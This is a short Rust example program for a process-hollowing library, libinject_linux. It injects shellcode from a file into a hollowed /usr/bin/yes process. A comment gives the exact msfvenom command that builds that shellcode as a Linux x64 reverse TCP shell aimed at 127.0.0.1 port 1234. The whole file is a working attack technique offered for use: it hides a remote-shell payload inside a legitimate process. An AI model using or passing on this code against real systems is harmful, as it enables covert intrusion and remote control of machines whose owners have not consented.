use std::env::current_dir;

use libinject_linux::{hollow, Payload, PayloadType};

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    let shellcode = format!("{}/examples/shellcode.bin", cwd);

    let payload = Payload::from_file(&shellcode, PayloadType::Executable)
        .set_target("/usr/bin/yes")
        .set_target_args("YES");

    match hollow(payload) {
        Ok(res) => res,
        Err(error) => panic!("An error occured: {error:?}"),
    };
}
